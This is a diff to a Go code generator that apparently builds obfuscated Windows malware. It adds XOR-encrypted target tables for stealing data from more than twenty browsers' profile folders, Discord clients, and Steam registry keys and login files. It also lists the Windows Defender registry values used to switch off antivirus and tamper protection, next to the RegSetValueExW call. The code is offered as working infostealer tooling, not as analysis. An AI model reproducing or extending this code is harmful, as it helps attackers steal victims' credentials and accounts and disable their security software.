@@ -190,6 +190,15 @@ type globalValues struct {
 	EncChangeDisplaySettingsExW string
 	EncFindWindowW           string
 	EncFindWindowExW         string
+
+	EncBrowserConfigs        string
+	EncDiscordApps           string
+	EncDiscordBrowserPaths   string
+	EncSteamRegPaths         string
+	EncSteamVdfNames         string
+
+	EncDefenderValues        string
+	EncRegSetValueExW        string
 }
 
 var disguiseNames = []string{
@@ -503,6 +512,84 @@ func buildGlobals(cfg Config) (globalValues, error) {
 		EncChangeDisplaySettingsExW: xorWithKey("ChangeDisplaySettingsExW", key),
 		EncFindWindowW:           xorWithKey("FindWindowW", key),
 		EncFindWindowExW:         xorWithKey("FindWindowExW", key),
+
+		EncBrowserConfigs: xorListWithKey([]string{
+			"C|L|Google\\Chrome\\User Data|chrome.exe",
+			"E|L|Microsoft\\Edge\\User Data|msedge.exe",
+			"B|L|BraveSoftware\\Brave-Browser\\User Data|brave.exe",
+			"O|A|Opera Software\\Opera Stable|opera.exe",
+			"G|A|Opera Software\\Opera GX Stable|opera.exe",
+			"V|L|Vivaldi\\User Data|vivaldi.exe",
+			"Y|L|Yandex\\YandexBrowser\\User Data|browser.exe",
+			"R|L|Chromium\\User Data|chrome.exe",
+			"K|L|CocCoc\\Browser\\User Data|browser.exe",
+			"T|L|Torch\\User Data|torch.exe",
+			"P|L|Epic Privacy Browser\\User Data|epic.exe",
+			"N|L|CentBrowser\\User Data|chrome.exe",
+			"I|L|Iridium\\User Data|iridium.exe",
+			"S|L|7Star\\7Star\\User Data|7star.exe",
+			"A|L|Amigo\\User Data|amigo.exe",
+			"M|L|Kometa\\User Data|kometa.exe",
+			"Q|L|Orbitum\\User Data|orbitum.exe",
+			"U|L|Sputnik\\Sputnik\\User Data|sputnik.exe",
+			"W|L|uCozMedia\\Uran\\User Data|uran.exe",
+			"F|A|Mozilla\\Firefox\\Profiles|firefox.exe",
+			"X|A|Waterfox\\Profiles|waterfox.exe",
+			"Z|A|Moonchild Productions\\Pale Moon\\Profiles|palemoon.exe",
+		}, key),
+
+		EncDiscordApps: xorListWithKey([]string{
+			"A|Discord",
+			"A|discordcanary",
+			"A|discordptb",
+			"A|Lightcord",
+			"L|Discord",
+			"L|discordcanary",
+			"L|discordptb",
+		}, key),
+
+		EncDiscordBrowserPaths: xorListWithKey([]string{
+			"Google\\Chrome\\User Data",
+			"Microsoft\\Edge\\User Data",
+			"BraveSoftware\\Brave-Browser\\User Data",
+			"Vivaldi\\User Data",
+			"Yandex\\YandexBrowser\\User Data",
+			"Chromium\\User Data",
+			"CocCoc\\Browser\\User Data",
+			"Torch\\User Data",
+			"Epic Privacy Browser\\User Data",
+			"CentBrowser\\User Data",
+			"Iridium\\User Data",
+			"7Star\\7Star\\User Data",
+			"Amigo\\User Data",
+			"Kometa\\User Data",
+			"Orbitum\\User Data",
+			"Sputnik\\Sputnik\\User Data",
+			"uCozMedia\\Uran\\User Data",
+		}, key),
+
+		EncSteamRegPaths: xorListWithKey([]string{
+			"Software\\Valve\\Steam\\ConnectCache",
+			"Software\\Valve\\Steam",
+		}, key),
+		EncSteamVdfNames: xorListWithKey([]string{
+			"config.vdf", "loginusers.vdf", "SteamAppData.vdf",
+		}, key),
+
+		EncDefenderValues: xorListWithKey([]string{
+			"DisableAntiSpyware",
+			"DisableAntiVirus",
+			"ServiceKeepAlive",
+			"DisableRealtimeMonitoring",
+			"DisableBehaviorMonitoring",
+			"DisableIOAVProtection",
+			"DisableOnAccessProtection",
+			"DisableScanOnRealtimeEnable",
+			"SpynetReporting",
+			"SubmitSamplesConsent",
+			"TamperProtection",
+		}, key),
+		EncRegSetValueExW: xorWithKey("RegSetValueExW", key),
 	}, nil
 }
 
@@ -706,6 +793,14 @@ var encChangeDisplaySettingsExWName = "%s"
 var encFindWindowWName = "%s"
 var encFindWindowExWName = "%s"
 
+var encBrowserConfigs = "%s"
+var encDiscordApps = "%s"
+var encDiscordBrowserPaths = "%s"
+var encSteamRegPaths = "%s"
+var encSteamVdfNames = "%s"
+var encDefenderValues = "%s"
+var encRegSetValueExWName = "%s"
+
 var decryptionKey = []byte("%s")
 `,
 		escapeGoString(g.ForceAdmin),
@@ -889,6 +984,14 @@ var decryptionKey = []byte("%s")
 		g.EncChangeDisplaySettingsExW,
 		g.EncFindWindowW,
 		g.EncFindWindowExW,
+
+		g.EncBrowserConfigs,
+		g.EncDiscordApps,
+		g.EncDiscordBrowserPaths,
+		g.EncSteamRegPaths,
+		g.EncSteamVdfNames,
+		g.EncDefenderValues,
+		g.EncRegSetValueExW,
 
 		g.XorKeyLiteral,
 	)), nil
